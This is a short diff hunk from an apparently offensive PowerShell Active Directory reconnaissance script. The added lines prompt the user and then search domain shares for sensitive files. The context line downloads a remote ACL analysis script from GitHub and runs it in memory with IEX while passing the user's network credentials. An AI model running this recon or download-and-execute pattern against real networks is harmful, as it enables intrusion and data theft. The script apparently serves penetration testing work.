@@ -360,6 +360,11 @@ function domainreconmodules
 	    
 	    Get-DomainGPOUserLocalGroupMapping -Identity $env:UserName -LocalGroup RDP >> $currentPath\DomainRecon\RDPAccess_Systems.txt 
 	    
+	    $session = Read-Host -Prompt 'Do you want to search for potential sensitive domain shares - can take a while? (yes/no)'
+            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
+            {
+	    	Find-InterestingDomainShareFile >> $currentPath\DomainRecon\InterestingDomainshares.txt
+	    }
             Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
             invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
 
